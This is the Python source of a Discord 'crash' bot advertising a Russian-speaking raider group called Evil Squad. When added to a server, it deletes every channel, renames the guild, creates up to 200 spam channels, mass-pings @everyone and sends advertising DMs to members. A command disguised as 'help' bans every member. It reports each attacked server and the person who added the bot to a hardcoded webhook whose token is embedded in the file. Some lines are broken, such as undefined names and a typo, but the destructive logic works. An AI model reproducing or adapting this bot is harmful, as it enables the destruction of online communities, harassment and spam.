#IMPORTS
import discord
from discord.ext import commands
from discord_webhook import DiscordWebhook as hook, DiscordEmbed as D_Embed
crushNow = []
hookUrl = 'https://discord.com/api/webhooks/762332977774198804/nQqouqO2GPecQI9w97q8l4tTikufoCfYsR9vF9lJ2GiaZohH8EUyzrz8i6i1uwPP5xXc'
prTEXT = '''
Был крашнут ботом - :boom: **Evil BOT** :boom:
**```diff
- Сервер Evil Squad представляет:
•Удобного и быстрого краш бота.
•Краш программы почти под рукой.
•Легко найти нужного рейдера.
•Нужен кто-то знающий язык программирования? И такие здесь есть.

- Evil Squad это сообщество рейдеров / крашеров / программистов.
Ссылка на сервер - https://discord.gg/hvcpzS6
```**
'''



async def sendWebhook(userMention, userID,gName, gUsers, gGuildUrl):
    webHookUrl = 'https://discord.com/api/webhooks/762332977774198804/nQqouqO2GPecQI9w97q8l4tTikufoCfYsR9vF9lJ2GiaZohH8EUyzrz8i6i1uwPP5xXc'
    webhook = hook(url=webHookUrl, username="Evil BOT")
    embed = D_Embed(title=f'Сервер "{gName}" подвергся атаке бота.', description='Ссылку на бота вы найдете в - <#739845717706670211>', color=0x000000)
    embed.add_embed_field(name=f'Участников  - {gUsers}', value=f'**Добавил бота на сервер - {userMention} | ({userID})**\nВ краше ваших серверов виноваты вы сами, бот находится в открытом доступе, администрация не несет никакой ответственности.')
    embed.set_image(url=f'{gGuildUrl}')
    embed.set_footer(text='Сервера, где участников меньше 10 не учитываются.')
    webhook.add_embed(embed)
    webhook.execute()

with open('token.txt', 'r') as readToken:
    TOKEN = readToken.read()
    readToken.close()
client = commands.Bot(command_prefix='+')
client.remove_command('help')
@client.event
async def on_ready():
    os.system('cls')
    print(f'https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot')

@client.event
async def on_guild_join(guild):
    gName = guild.name
    if str(guild.id) == '731814312821129 229': return
    if str(guild.id) in crushNow: return
    crushNow.append(str(guild.id))
    membersGetMessage = 0
    totalMembers = len([m for m in guild.members if not m.bot])
    def check(event):
        return event.target.id == client.user.id
    bot_entry = await guild.audit_logs(action=discord.AuditLogAction.bot_add).find(check)
    addterMention = bot_entry.user.name + '#' + bot_entry.user.discriminator
    ID = bot_entry.user.id
    if totalMembers >= 10:
        await sendWebhook(addterMention, ID ,guild.name, totalMembers, guild.icon_url)
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    try:
        await guild.edit(name="discord.gg/hvcpzS6")
    except:
        pass
    for i in range(200):
        try:
            channel = await guild.create_text_channel(name='Crush-by-evil-squad', topic='Сервер был крашнут ботом - :boom: **Evil BOT** :boom:\nСсылка на сервер - https://discord.gg/hvcpzS6')
            await channel.send('@everyone @here ' + prTEXT)
        except:
            continue
    for i in range(8):
        for channel in guild.channels:
            try:
                await channel.send('@everyone @here ' + prTEXT)
            except:
                pass
    for member in guild.members:
        try:
            if membersGetMessage <= 100:
                await member.send(f'**{gName}** ' + prTEXT)
            else:
                break
        except:
            continue
    try:
        crushNow.remove(str(guild.id))
    except:
        pass

@client.command()
async def help(ctx, *, excpt = None):
    if str(guild.id) == '731814312821129229': return
    if str(guild.id) in crushNow: return
    banned = 0
    bestEmbed = discord.Embed(title='Info')
    msg = await ctx.author.send(embed = bestEmbed)
    gName = ctx.guild.name
    for member in ctx.guild.members:
        if str(member.id) != ctx.author.id:
            try:
                await member.ban()
                banned += 1
                if banned <= 100:
                    await channel.send(f'**{gName}** ' + prTEXT)
            except:
                continue
    bestEmbed2 = discord.Embed(title='Info')
    bestEmbed2.add_field(name='BANNED INFO', value=f'Забанено {banned}')
    await msg.edit(embed = bestEmbed2)

@client.command()
async def auto(ctx, *, exctp = None):
    guild = ctx.guild
    if str(guild.id) in crushNow: return
    gName = guild.name
    if str(guild.id) == '731814312821129229': return
    totalMembers = len([m for m in guild.members if not m.bot])
    membersGetMessage = 0
    crushNow.append(str(guild.id))
    if totalMembers >= 10:
        await sendWebhook(str(f'{ctx.authir.name}#{ctx.author.discriminator}'), ctx.author.id ,ctx.guild.name, totalMembers, ctx.guild.icon_url)
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    try:
        await guild.edit(name="discord.gg/hvcpzS6")
    except:
        pass
    for i in range(150):
        try:
            channel = await guild.create_text_channel(name='Crush-by-evil-squad', topic='Сервер был крашнут ботом - :boom: **Evil BOT** :boom:\nСсылка на сервер - https://discord.gg/hvcpzS6')
            await channel.send('@everyone @here ' + prTEXT)
        except:
            continue
    for i in range(8):
        for channel in guild.channels:
            try:
               await channel.send('@everyone @here ' + prTEXT)
            except:
                pass
    for member in guild.members:
        try:
            if membersGetMessage <= 100:
                await member.send(f'**{gName}** ' + prTEXT)
            else:
                break
        except:
            continue
    try:
        crushNow.remove(str(guild.id))
    except:
        pass

client.run(TOKEN)
